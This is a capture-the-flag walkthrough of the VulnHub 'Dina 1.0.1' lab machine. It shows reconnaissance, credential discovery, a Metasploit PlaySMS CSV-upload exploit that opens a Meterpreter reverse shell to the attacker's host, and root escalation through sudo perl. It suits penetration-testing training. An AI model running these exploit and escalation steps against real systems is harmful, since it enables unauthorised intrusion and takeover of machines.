# Dina: 1.0.1

## 1.Get VM IP

```bash
root@kali: arp-scan -I eth0 -l

Interface: eth0, type: EN10MB, MAC: 08:00:27:b2:e9:3f, IPv4: 192.168.56.102
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1    0a:00:27:00:00:0f       (Unknown: locally administered)
192.168.56.100  08:00:27:d7:c0:71       PCS Systemtechnik GmbH
192.168.56.108  08:00:27:b9:c3:c6       PCS Systemtechnik GmbH
```

The IP address `192.168.56.108`, let's enumerate it.


## 2.Enumeration

```bash
root@kali: nmap -sV -sC -p- -oN nmap.out 192.168.56.108

Nmap scan report for 192.168.56.108
Host is up (0.00046s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
| http-robots.txt: 5 disallowed entries 
|_/ange1 /angel1 /nothing /tmp /uploads
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Dina
MAC Address: 08:00:27:B9:C3:C6 (Oracle VirtualBox virtual NIC)
```

We explore the website and fuzz the web application :

![MainPage](https://github.com/Git-K3rnel/VulnHub/assets/127470407/cd80ecb5-6813-4ff2-9c0b-adbe5f7088b6)

see robots.txt and the following directories are disallowed :

```text
User-agent: *
Disallow: /ange1
Disallow: /angel1
Disallow: /nothing
Disallow: /tmp
Disallow: /uploads
```

go to `nothing` directory and see the page source, there is a comment here :

```text
<!--
#my secret pass
freedom
password
helloworld!
diana
iloveroot
-->
```

we collect these possible passwords for later use, and now we can fuzz the application :

```bash
root@kali: gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.56.108

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 3618]
/uploads              (Status: 301) [Size: 318] [--> http://192.168.56.108/uploads/]
/secure               (Status: 301) [Size: 317] [--> http://192.168.56.108/secure/]
/robots               (Status: 200) [Size: 102]
/tmp                  (Status: 301) [Size: 314] [--> http://192.168.56.108/tmp/]
/nothing              (Status: 301) [Size: 318] [--> http://192.168.56.108/nothing/]
```

navigate to `/secure` and download the `backup.zip` file :

![zipfile](https://github.com/Git-K3rnel/VulnHub/assets/127470407/0d31dd89-96eb-4572-86a1-ea84fb5ce581)

to unzip the file you need to provide a password, i used `freedom` as we found a list of passwords previously on comment in `/nothing` directory :

```bash
root@kali: 7za e backup.zip

Enter password (will not be echoed):
Everything is Ok      

Size:       176
Compressed: 336
```
see the file type of `backup-cred.mp3 ` :

```bash
file backup-cred.mp3                                                                                
backup-cred.mp3: ASCII tex
```

now cat the content of backup-cred.mp3 

```bash
cat backup-cred.mp3

I am not toooo smart in computer .......dat the resoan i always choose easy password...with creds backup file....

uname: touhid
password: ******


url : /SecreTSMSgatwayLogin
```

great now we have a user `touhid` and new directory `/SecreTSMSgatwayLogin`

navigate to this directory and try to login with user touhid and test the passwords you found on comment previously :

![playsms](https://github.com/Git-K3rnel/VulnHub/assets/127470407/4c63f263-9463-4470-afe6-bd227dfb9874)

after trying the passwords, i found that i can login with `touhid:diana` :

![loginpanel](https://github.com/Git-K3rnel/VulnHub/assets/127470407/46c5b8c5-a675-44be-be59-99662a022295)

## 3.Gaining Shell

after a while searching, i found that searchsploit has something with `playsms` panel :

```bash
root@kali: searchsploit playsms 

PlaySMS - 'import.php' (Authenticated) CSV File Upload Code Execution (Metasploit)  | php/remote/44598.rb
PlaySMS - index.php Unauthenticated Template Injection Code Execution (Metasploit)  | php/remote/48335.rb
...
```

use metasploit to get code execution :

```bash
root@kali: msfconsole

msf6 > search playsms

Matching Modules
================

   #  Name                                           Disclosure Date  Rank       Check  Description
   -  ----                                           ---------------  ----       -----  -----------
   0  exploit/multi/http/playsms_uploadcsv_exec      2017-05-21       excellent  Yes    PlaySMS import.php Authenticated CSV File Upload Code Execution
   1  exploit/multi/http/playsms_template_injection  2020-02-05       excellent  Yes    PlaySMS index.php Unauthenticated Template Injection Code Execution
   2  exploit/multi/http/playsms_filename_exec       2017-05-21       excellent  Yes    PlaySMS sendfromfile.php Authenticated "Filename" Field Code Execution

msf6 > use 0

msf6 exploit(multi/http/playsms_uploadcsv_exec) > set password diana
password => diana
msf6 exploit(multi/http/playsms_uploadcsv_exec) > set username touhid
username => touhid
msf6 exploit(multi/http/playsms_uploadcsv_exec) > set rhosts 192.168.56.108
rhosts => 192.168.56.108
msf6 exploit(multi/http/playsms_uploadcsv_exec) > set targeturi /SecreTSMSgatwayLogin
targeturi => /SecreTSMSgatwayLogin
msf6 exploit(multi/http/playsms_uploadcsv_exec) > set lhost 192.168.56.102
lhost => 192.168.56.102
msf6 exploit(multi/http/playsms_uploadcsv_exec) > options

Module options (exploit/multi/http/playsms_uploadcsv_exec):

   Name       Current Setting        Required  Description
   ----       ---------------        --------  -----------
   PASSWORD   diana                  yes       Password to authenticate with
   Proxies                           no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.56.108         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80                     yes       The target port (TCP)
   SSL        false                  no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /SecreTSMSgatwayLogin  yes       Base playsms directory path
   USERNAME   touhid                 yes       Username to authenticate with
   VHOST                             no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.56.102   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   PlaySMS 1.4

msf6 exploit(multi/http/playsms_uploadcsv_exec) > run

[*] Started reverse TCP handler on 192.168.56.102:4444 
[+] Authentication successful: touhid:diana
[*] Sending stage (39927 bytes) to 192.168.56.108
[*] Meterpreter session 1 opened (192.168.56.102:4444 -> 192.168.56.108:40307) at 2023-10-17 07:05:51 -0400

meterpreter > shell
Process 2393 created.
Channel 0 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 4.Privilege Escalation

Checking our sudo permissions :

```bash
www-data@Dina:/home$ sudo -l
sudo -l
Matching Defaults entries for www-data on this host:
    env_reset,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on this host:
    (ALL) NOPASSWD: /usr/bin/perl
```

yes, we can execute perl binary.

check gtfobins to see how to use perl for PE :

```bash
www-data@Dina:/home$ sudo perl -e 'exec "/bin/sh";'

# id
uid=0(root) gid=0(root) groups=0(root)

# cd /root
# cat flag.txt
________                                                _________
\________\--------___       ___         ____----------/_________/
    \_______\----\\\\\\   //_ _ \\    //////-------/________/
        \______\----\\|| (( ~|~ )))  ||//------/________/
            \_____\---\\ ((\ = / ))) //----/_____/
                 \____\--\_)))  \ _)))---/____/
                       \__/  (((     (((_/
                          |  -)))  -  ))


root password is : hello@3210
easy one .....but hard to guess.....
but i think u dont need root password......
u already have root shelll....


CONGO.........
FLAG : 22d06624cd604a0626eb5a2992a6f2e6
```

This is how you can get root on this machine :)







